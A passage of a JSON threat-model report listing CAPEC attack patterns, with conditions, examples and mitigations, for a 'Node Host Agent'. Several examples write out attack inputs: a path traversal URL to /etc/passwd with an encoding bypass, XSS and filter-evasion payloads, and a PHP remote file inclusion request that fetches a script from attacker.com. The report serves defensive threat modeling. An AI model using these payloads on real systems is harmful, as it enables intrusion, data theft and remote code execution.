"references": "https://capec.mitre.org/data/definitions/136.html, http://cwe.mitre.org/data/definitions/77.html, http://cwe.mitre.org/data/definitions/90.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "INP09"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Parameter Injection", "details": "An adversary manipulates the content of request parameters for the purpose of undermining the security of the target. Some parameter encodings use text characters as separators. For example, parameters in a HTTP GET message are encoded as name-value pairs separated by an ampersand (&). If an attacker can supply text strings that are used to fill in these parameters, then they can inject special characters used in the encoding scheme to add or modify parameters. For example, if user input is fed directly into an HTTP GET request and the user provides the value myInput&new_param=myValue, then the input parameter is set to myInput, but a new parameter (new_param) is also added with a value of myValue. This can significantly change the meaning of the query that is processed by the server. Any encoding scheme where parameters are identified and separated by text characters is potentially vulnerable to this attack - the HTTP GET encoding used above is just one example.", "example": "The target application accepts a string as user input, fails to sanitize characters that have a special meaning in the parameter encoding, and inserts the user-supplied string in an encoding which is then processed.", "id": "228", "mitigations": "Implement an audit log written to a separate host. In the event of a compromise, the audit log may be able to provide evidence and details of the compromise. Treat all user input as untrusted data that must be validated before use.", "references": "https://capec.mitre.org/data/definitions/137.html, http://cwe.mitre.org/data/definitions/88.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "INP10"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Relative Path Traversal", "details": "An attacker exploits a weakness in input validation on the target by supplying a specially constructed path utilizing dot and slash characters for the purpose of obtaining access to arbitrary files or resources. An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or ) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.", "example": "The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker.", "id": "229", "mitigations": "Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach. Implementation: Prefer working without user input when using file system calls. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications.", "references": "https://capec.mitre.org/data/definitions/139.html, http://cwe.mitre.org/data/definitions/23.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "INP11"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Input Data Manipulation", "details": "An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.", "example": "A target application has an integer variable for which only some integer values are expected by the application. But since it does not have any checks in place to validate the value of the input, the attacker is able to manipulate the targeted integer variable such that normal operations result in non-standard values.", "id": "230", "mitigations": "Validation of user input for type, length, data-range, format, etc.", "references": "https://capec.mitre.org/data/definitions/153.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "INP14"}, {"assumption": null, "condition": "target.controls.implementsAuthenticationScheme is False", "cvss": "", "description": "Dictionary-based Password Attack", "details": "An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.", "example": "A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096", "id": "231", "mitigations": "Create a strong password policy and ensure that your system enforces this policy.Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.", "references": "https://capec.mitre.org/data/definitions/16.html, http://cwe.mitre.org/data/definitions/521.html, http://cwe.mitre.org/data/definitions/262.html, http://cwe.mitre.org/data/definitions/263.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "CR03"}, {"assumption": null, "condition": "target.controls.isHardened is False", "cvss": "", "description": "Footprinting", "details": "An adversary engages in probing and exploration activities to identify constituents and properties of the target. Footprinting is a general term to describe a variety of information gathering techniques, often used by attackers in preparation for some attack. It consists of using tools to learn as much as possible about the composition, configuration, and security mechanisms of the targeted application, system or network. Information that might be collected during a footprinting effort could include open ports, applications and their versions, network topology, and similar information. While footprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.", "example": "In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident.", "id": "232", "mitigations": "Keep patches up to date by installing weekly or daily if possible.Shut down unnecessary services/ports.Change default passwords by choosing strong passwords.Curtail unexpected input.Encrypt and password-protect sensitive data.Avoid including information that has the potential to identify and compromise your organization's security such as access to business plans, formulas, and proprietary documents.", "references": "https://capec.mitre.org/data/definitions/169.html, http://cwe.mitre.org/data/definitions/200.html", "response": "", "severity": "Very Low", "target": "Node Host Agent", "threat_id": "DS03"}, {"assumption": null, "condition": "target.controls.isHardened is False or target.controls.hasAccessControl is False", "cvss": "", "description": "Using Malicious Files", "details": "An attack of this type exploits a system's configuration that allows an attacker to either directly access an executable file, for example through shell access; or in a possible worst case allows an attacker to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.", "example": "Consider a directory on a web server with the following permissions drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot This could allow an attacker to both execute and upload and execute programs' on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit.", "id": "233", "mitigations": "Design: Enforce principle of least privilegeDesign: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.", "references": "https://capec.mitre.org/data/definitions/17.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/272.html, http://cwe.mitre.org/data/definitions/270.html", "response": "", "severity": "Very High", "target": "Node Host Agent", "threat_id": "AC06"}, {"assumption": null, "condition": "target.controls.validatesHeaders is False or target.controls.encodesOutput is False or target.controls.isHardened is False", "cvss": "", "description": "Web Application Fingerprinting", "details": "An attacker sends a series of probes to a web application in order to elicit version-dependent and type-dependent behavior that assists in identifying the target. An attacker could learn information such as software versions, error pages, and response headers, variations in implementations of the HTTP protocol, directory structures, and other similar information about the targeted service. This information can then be used by an attacker to formulate a targeted attack plan. While web application fingerprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.", "example": "An attacker sends malformed requests or requests of nonexistent pages to the server. Consider the following HTTP responses. Response from Apache 1.3.23$ nc apache.server.com80 GET / HTTP/3.0 HTTP/1.1 400 Bad RequestDate: Sun, 15 Jun 2003 17:12: 37 GMTServer: Apache/1.3.23Connection: closeTransfer: chunkedContent-Type: text/HTML; charset=iso-8859-1 Response from IIS 5.0$ nc iis.server.com 80GET / HTTP/3.0 HTTP/1.1 200 OKServer: Microsoft-IIS/5.0Content-Location: http://iis.example.com/Default.htmDate: Fri, 01 Jan 1999 20:14: 02 GMTContent-Type: text/HTMLAccept-Ranges: bytes Last-Modified: Fri, 01 Jan 1999 20:14: 02 GMTETag: W/e0d362a4c335be1: ae1Content-Length: 133 [R.170.2]", "id": "234", "mitigations": "Implementation: Obfuscate server fields of HTTP response.Implementation: Hide inner ordering of HTTP response header.Implementation: Customizing HTTP error codes such as 404 or 500.Implementation: Hide URL file extension.Implementation: Hide HTTP response header software information filed.Implementation: Hide cookie's software information filed.Implementation: Appropriately deal with error messages.Implementation: Obfuscate database type in Database API's error message.", "references": "https://capec.mitre.org/data/definitions/170.html, http://cwe.mitre.org/data/definitions/497.html", "response": "", "severity": "Low", "target": "Node Host Agent", "threat_id": "HA03"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Targeting Non-Script Elements", "details": "This attack is a form of Cross-Site Scripting (XSS) where malicious scripts are embedded in elements that are not expected to host scripts such as image tags (<img>), comments in XML documents (< !-CDATA->), etc. These tags may not be subject to the same input validation, output validation, and other content filtering and checking routines, so this can create an opportunity for an attacker to tunnel through the application's elements and launch a XSS attack through other elements. As with all remote attacks, it is important to differentiate the ability to launch an attack (such as probing an internal network for unpatched servers) and the ability of the remote attacker to collect and interpret the output of said attack.", "example": "An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. A malicious user embeds JavaScript in the IMG tags in his messages that gets executed within the victim's browser whenever the victim reads these messages. <img src=javascript:alert('XSS')> When executed within the victim's browser, the malicious script could accomplish a number of adversary objectives including stealing sensitive information such as usernames, passwords, or cookies.", "id": "235", "mitigations": "In addition to the traditional input fields, all other user controllable inputs, such as image tags within messages or the likes, must also be subjected to input validation. Such validation should ensure that content that can be potentially interpreted as script by the browser is appropriately filtered.All output displayed to clients must be properly escaped. Escaping ensures that the browser interprets special scripting characters literally and not as script to be executed.", "references": "https://capec.mitre.org/data/definitions/18.html, http://cwe.mitre.org/data/definitions/80.html", "response": "", "severity": "Very High", "target": "Node Host Agent", "threat_id": "SC02"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False", "cvss": "", "description": "Exploiting Incorrectly Configured Access Control Security Levels", "details": "An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack. Most commonly, attackers would take advantage of controls that provided too little protection for sensitive activities in order to perform actions that should be denied to them. In some circumstances, an attacker may be able to take advantage of overly restrictive access control policies, initiating denial of services (if an application locks because it unexpectedly failed to be granted access) or causing other legitimate actions to fail due to security. The latter class of attacks, however, is usually less severe and easier to detect than attacks based on inadequate security restrictions. This attack pattern differs from CAPEC 1, Accessing Functionality Not Properly Constrained by ACLs in that the latter describes attacks where sensitive functionality lacks access controls, where, in this pattern, the access control is present, but incorrectly configured.", "example": "For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application.", "id": "236", "mitigations": "Design: Configure the access control correctly.", "references": "https://capec.mitre.org/data/definitions/180.html, http://cwe.mitre.org/data/definitions/732.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "AC07"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.hasAccessControl is False", "cvss": "", "description": "Embedding Scripts within Scripts", "details": "An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. The adversary leverages this capability to execute his/her own script by embedding it within other scripts that the target software is likely to execute. The adversary must have the ability to inject their script into a script that is likely to be executed. If this is done, then the adversary can potentially launch a variety of probes and attacks against the web server's local environment, in many cases the so-called DMZ, back end resources the web server can communicate with, and other hosts. With the proliferation of intermediaries, such as Web App Firewalls, network devices, and even printers having JVMs and Web servers, there are many locales where an attacker can inject malicious scripts. Since this attack pattern defines scripts within scripts, there are likely privileges to execute said attack on the host. These attacks are not solely limited to the server side, client side scripts like Ajax and client side JavaScript can contain malicious scripts as well.", "example": "Ajax applications enable rich functionality for browser based web applications. Applications like Google Maps deliver unprecedented ability to zoom in and out, scroll graphics, and change graphic presentation through Ajax. The security issues that an attacker may exploit in this instance are the relative lack of security features in JavaScript and the various browser's implementation of JavaScript, these security gaps are what XSS and a host of other client side vulnerabilities are based on. While Ajax may not open up new security holes, per se, due to the conversational aspects between client and server of Ajax communication, attacks can be optimized. A single zoom in or zoom out on a graphic in an Ajax application may round trip to the server dozens of times. One of the first steps many attackers take is frequently footprinting an environment, this can include scanning local addresses like 192.*.*.* IP addresses, checking local directories, files, and settings for known vulnerabilities, and so on. <IMG SRC=javascript:alert('XSS')> The XSS script that is embedded in a given IMG tag can be manipulated to probe a different address on every click of the mouse or other motions that the Ajax application is aware of. In addition the enumerations allow for the attacker to nest sequential logic in the attacks. While Ajax applications do not open up brand new attack vectors, the existing attack vectors are more than adequate to execute attacks, and now these attacks can be optimized to sequentially execute and enumerate host environments.~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell.", "id": "237", "mitigations": "Use browser technologies that do not allow client side scripting.Utilize strict type, character, and encoding enforcement.Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.Ensure all content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all remote content.Perform output validation for all remote content.Disable scripting languages such as JavaScript in browserSession tokens for specific hostPatching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode", "references": "https://capec.mitre.org/data/definitions/19.html, http://cwe.mitre.org/data/definitions/284.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "SC03"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "PHP Remote File Inclusion", "details": "In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized include or require call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions.", "example": "The adversary controls a PHP script on a server http://attacker.com/rfi.txt The .txt extension is given so that the script doesn't get executed by the attacker.com server, and it will be downloaded as text. The target application is vulnerable to PHP remote file inclusion as following: include($_GET['filename'] . '.txt') The adversary creates an HTTP request that passes his own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi with the concatenation of the .txt prefix, the PHP runtime download the attack's script and the content of the script gets executed in the same context as the rest of the original script.", "id": "238", "mitigations": "Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Only allow known files to be included (whitelist)Implementation: Make use of indirect references passed in URL parameters instead of file namesConfiguration: Ensure that remote scripts cannot be include in the include or require PHP directives", "references": "https://capec.mitre.org/data/definitions/193.html, http://cwe.mitre.org/data/definitions/98.html, http://cwe.mitre.org/data/definitions/80.html, http://cwe.mitre.org/data/definitions/714.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "INP16"}, {"assumption": null, "condition": "target.controls.authenticatesSource is False", "cvss": "", "description": "Principal Spoof", "details": "A Principal Spoof is a form of Identity Spoofing where an adversary pretends to be some other person in an interaction. This is often accomplished by crafting a message (either written, verbal, or visual) that appears to come from a person other than the adversary. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. A Principal Spoof does not use stolen or spoofed authentication credentials, instead relying on the appearance and content of the message to reflect identity. The possible outcomes of a Principal Spoof mirror those of Identity Spoofing. (e.g., escalation of privilege and false attribution of data or activities) Likewise, most techniques for Identity Spoofing (crafting messages or intercepting and replaying or modifying messages) can be used for a Principal Spoof attack. However, because a Principal Spoof is used to impersonate a person, social engineering can be both an attack technique (using social techniques to generate evidence in support of a false identity) as well as a possible outcome (manipulating people's perceptions by making statements or performing actions under a target's name).", "example": "An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.", "id": "239", "mitigations": "Employ robust authentication processes (e.g., multi-factor authentication).", "references": "https://capec.mitre.org/data/definitions/195.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "AA02"}, {"assumption": null, "condition": "target.controls.encodesOutput is False or target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "XSS Targeting Error Pages", "details": "An adversary distributes a link (or possibly some other query structure) with a request to a third party web server that is malformed and also contains a block of exploit code in order to have the exploit become live code in the resulting error page. When the third party web server receives the crafted request and notes the error it then creates an error message that echoes the malformed message, including the exploit. Doing this converts the exploit portion of the message into to valid language elements that are executed by the viewing browser. When a victim executes the query provided by the attacker the infected error message error message is returned including the exploit code which then runs in the victim's browser. XSS can result in execution of code as well as data leakage (e.g. session cookies can be sent to the attacker). This type of attack is especially dangerous since the exploit appears to come from the third party web server, who the victim may trust and hence be more vulnerable to deception.", "example": "A third party web server fails to adequately sanitize messages sent in error pages. Adversary takes advantage of the data displayed in the error message.", "id": "240", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be used in error messages.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/198.html, http://cwe.mitre.org/data/definitions/81.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "DS04"}, {"assumption": null, "condition": "target.controls.sanitizesInput is False or target.controls.validatesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Using Alternate Syntax", "details": "An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the script tag using the alternate forms of Script or ScRiPt may bypass filters where script is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.", "example": "In this example, the attacker tries to get a script executed by the victim's browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An attacker will then create a special payload to bypass this filter: <scriscriptpt>alert(1)</scscriptript> when the applications gets this input string, it will replace all script (case insensitive) by the empty string and the resulting input will be the desired vector by the attacker. In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., <script>HERE</script>). For the attacker to execute the same payload as in the previous example, he would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter ((w+)s*(.*)|alert|eval|function|document) and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string alert would be stripped. An attacker will then create a special payload to bypass this filter: this['al' + 'ert'](1) when the applications gets this input string, it won't replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The attacker could also have used non-alphanumeric XSS vectors to bypass the filter; for example, ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_) would be executed by the JavaScript engine like alert(1) is.", "id": "241", "mitigations": "Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcementImplementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.", "references": "https://capec.mitre.org/data/definitions/199.html, http://cwe.mitre.org/data/definitions/87.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "SC04"}, {"assumption": null, "condition": "target.controls.usesEncryptionAlgorithm != 'RSA' and target.controls.usesEncryptionAlgorithm != 'AES'", "cvss": "", "description": "Encryption Brute Forcing", "details": "An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.", "example": "In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.", "id": "242", "mitigations": "Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.", "references": "https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html", "response": "", "severity": "Low", "target": "Node Host Agent", "threat_id": "CR05"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False", "cvss": "", "description": "Manipulate Registry Information", "details": "An adversary exploits a weakness in authorization in order to modify content within a registry (e.g., Windows Registry, Mac plist, application registry). Editing registry information can permit the adversary to hide configuration information or remove indicators of compromise to cover up activity. Many applications utilize registries to store configuration and service information. As such, modification of registry information can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of a targeted application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes a preliminary step towards completing another attack pattern, but given the long term usage of many registry values, manipulation of registry information could be its own end.", "example": "Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application's ability to store it).", "id": "243", "mitigations": "Ensure proper permissions are set for Registry hives to prevent users from modifying keys.Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.Employ robust identification and audit/blocking via whitelisting of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.", "references": "https://capec.mitre.org/data/definitions/203.html, http://cwe.mitre.org/data/definitions/15.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "AC08"}, {"assumption": null, "condition": "target.controls.providesIntegrity is False or target.controls.usesCodeSigning is False", "cvss": "", "description": "Removing Important Client Functionality", "details": "An attacker removes or disables functionality on the client that the server assumes to be present and trustworthy. Attackers can, in some cases, get around logic put in place to 'guard' sensitive functionality or data. Client applications may include functionality that a server relies on for correct and secure operation. This functionality can include, but is not limited to, filters to prevent the sending of dangerous content to the server, logical functionality such as price calculations, and authentication logic to ensure that only authorized users are utilizing the client. If an attacker can disable this functionality on the client, they can perform actions that the server believes are prohibited. This can result in client behavior that violates assumptions by the server leading to a variety of possible attacks. In the above examples, this could include the sending of dangerous content (such as scripts) to the server, incorrect price calculations, or unauthorized access to server resources.", "example": "Attacker reverse engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the Attacker simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.Attacker uses click-through exploration of a Servlet-based website to map out its functionality, taking note of its URL-naming conventions and Servlet mappings. Using this knowledge and guessing the Servlet name of functionality they're not authorized to use, the Attacker directly navigates to the privileged functionality around the authorizing single-front controller (implementing programmatic authorization checks).Attacker reverse-engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the Attacker simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.", "id": "244", "mitigations": "Design: For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side.Design: Ship client-side application with integrity checks (code signing) when possible.Design: Use obfuscation and other techniques to prevent reverse engineering the client code.", "references": "http://cwe.mitre.org/data/definitions/602.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "SC05"}, {"assumption": null, "condition": "target.controls.validatesContentType is False or target.controls.invokesScriptFilters is False", "cvss": "", "description": "XSS Using MIME Type Mismatch", "details": "An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.", "example": "For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters.", "id": "245", "mitigations": "Design: Browsers must invoke script filters to detect that the specified MIME type of the file matches the actual type of its content before deciding which script interpreter to use.", "references": "http://cwe.mitre.org/data/definitions/79.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/646.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "INP17"}, {"assumption": null, "condition": "target.controls.providesIntegrity is False or target.controls.authenticatesSource is False or target.controls.usesStrongSessionIdentifiers is False", "cvss": "", "description": "Exploitation of Trusted Credentials", "details": "Attacks on session IDs and resource IDs take advantage of the fact that some software accepts user input without verifying its authenticity. For example, a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or indeed the process that wrote the message to the queue are authentic and authorized to do so. Many server side processes are vulnerable to these attacks because the server to server communications have not been analyzed from a security perspective or the processes trust other systems because they are behind a firewall. In a similar way servers that use easy to guess or spoofable schemes for representing digital identity can also be vulnerable. Such systems frequently use schemes without cryptography and digital signatures (or with broken cryptography). Session IDs may be guessed due to insufficient randomness, poor protection (passed in the clear), lack of integrity (unsigned), or improperly correlation with access control policy enforcement points. Exposed configuration and properties files that contain system passwords, database connection strings, and such may also give an attacker an edge to identify these identifiers. The net result is that spoofing and impersonation is possible leading to an attacker's ability to break authentication, authorization, and audit controls on the system.", "example": "Thin client applications like web applications are particularly vulnerable to session ID attacks. Since the server has very little control over the client, but still must track sessions, data, and objects on the server side, cookies and other mechanisms have been used to pass the key to the session data between the client and server. When these session keys are compromised it is trivial for an attacker to impersonate a user's session in effect, have the same capabilities as the authorized user. There are two main ways for an attacker to exploit session IDs. A brute force attack involves an attacker repeatedly attempting to query the system with a spoofed session header in the HTTP request. A web server that uses a short session ID can be easily spoofed by trying many possible combinations so the parameters session-ID= 1234 has few possible combinations, and an attacker can retry several hundred or thousand request with little to no issue on their side. The second method is interception, where a tool such as wireshark is used to sniff the wire and 